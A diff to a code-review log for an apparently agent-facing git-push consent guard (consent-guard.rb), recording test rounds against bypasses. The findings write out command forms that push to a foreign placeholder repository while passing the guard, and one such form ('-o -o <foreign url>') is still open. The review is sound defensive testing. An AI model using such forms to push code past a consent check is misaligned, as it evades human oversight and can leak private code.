@@ -193,3 +193,24 @@ Findings:
 - [ ] Important: `--repo` takes precedence over the positional repository, the reverse of git. `git help push` says of `--repo`: "If both are specified, the command-line argument takes precedence." `git push --repo=origin git@github.com:someone-else/x.git b`, `git push --repo origin git@github.com:someone-else/x.git b` and `git push --repo=git@github.com:eirvandelden/x.git git@github.com:someone-else/x.git b` exit 0. Git pushes to the foreign URL (confirmed with a stub `GIT_SSH_COMMAND`, which git invoked). The guard checks `origin` as the repository, and later words are checked only for `://` or a resolvable name. origin/main also exits 0, so this is not a regression, and an agent rarely writes both. But the commit claims "--repo names the repository", and it is the same shape as R5's second Important. Prefer `arguments.first || repo_option(window)`, and add one of these commands to `test_an_option_value_does_not_hide_the_repository`. — `claude/.claude/hooks/consent-guard.rb:121` →
 - [ ] Nit: `file:/tmp/x` with a single slash is a ssh host to git, not a local path. Git treats only `file://` as the file scheme; `git push file:/tmp/x main` invoked the stub `GIT_SSH_COMMAND` with host `file`. The guard now passes it, as origin/main does. Nothing leaves the machine unless an ssh alias named `file` exists. Narrow the exclusion to `file://`, or accept it. — `claude/.claude/hooks/consent-guard.rb:144` →
 - [ ] Nit: A value option whose value is itself a value option shifts the repository. `git push -o -o git@github.com:someone-else/x.git b` exits 0 (origin/main 0); git reads the second `-o` as the value and pushes to the URL (confirmed with the stub). `positional` drops a word after any value option without checking that the option itself was a value. Contrived; accept it or record it. — `claude/.claude/hooks/consent-guard.rb:132` →
+
+## Round 7 — 2026-10-07T19:29Z — 17fa6a00
+
+Suite: `test/consent_guard_test.rb` 50 runs green (about 42 s), `test/guard_parity_test.rb` 9 runs green, rubocop clean on the two touched Ruby files. The branch sits on origin/main 9ec33c9a; the rebase left no conflict markers and `git diff --check` is clean. Commit 17fa6a00 adds three commands to `test_an_option_value_does_not_hide_the_repository` and removes or weakens no test. Every test named in `plan.md` `## Proof` exists. The working tree is clean.
+
+Earlier findings (verified by running the branch guard and the origin/main guard on the same commands in a scratch repository, with an empty allowlist file):
+
+- R6 Important `--repo` took precedence over the positional repository: fixed. `git push --repo=origin git@github.com:someone-else/x.git b`, `--repo origin <foreign url> b`, `--repo=<allowed url> <foreign url> b`, `--repo=<foreign url> origin b` and `--repo=origin -- <foreign url> b` exit 2 (origin/main 0). `--repo=origin b`, `--repo origin b` and `--repo=<allowed https url> origin b` exit 0.
+- R6 Nit `file:/x` read as local: fixed. `git push file:/tmp/x b` exits 2 (origin/main 0). `git push file:///tmp/x b`, `/tmp/x b` and `../x b` exit 0, as on origin/main.
+- R6 Nit a value option as the value of another: still open, not addressed. `git push -o -o <foreign url> b` and the new sibling `git push --repo --repo <foreign url> b` exit 0 (origin/main 0). Contrived, not a regression; accept or record it.
+- R1 probe 1 needed a prompt to escalate: still open. Probes 3 and 4 not run: still open, run by hand, not blocking.
+
+Known, signed-off limits, not re-raised: unknown names pass, two lines share a window, `bash -c`, a foreign `--git-dir`, `)`/backtick/`#` not ending a window, `:443`.
+
+Behaviour change, by design and stated in the commit: `git push --repo=upstream origin b` now asks (origin/main 0), though git pushes to `origin`. A prompt on a contrived form, never a silent push; not a finding.
+
+Regression sweep: `git push`, `-u origin HEAD`, `--force-with-lease origin b`, `origin release-1.2:release-1.2`, `git push origin b && open https://…`, `git stash push -m "feat: add x"`, `-o ci.skip origin b`, an allowed scp-like and https URL exit 0. `upstream b`, `--repo upstream b`, `--repo=origin upstream b`, `--all upstream` and `-C . upstream b` exit 2. No case that exited 2 in round 6 now exits 0.
+
+Acceptance criteria: unchanged from round 6. `test_an_option_value_does_not_hide_the_repository` now also covers `--repo` with a positional repository and `file:/x`. Probes 1, 3 and 4 remain the only open proofs, run by hand, not blocking.
+
+Findings: nothing found.
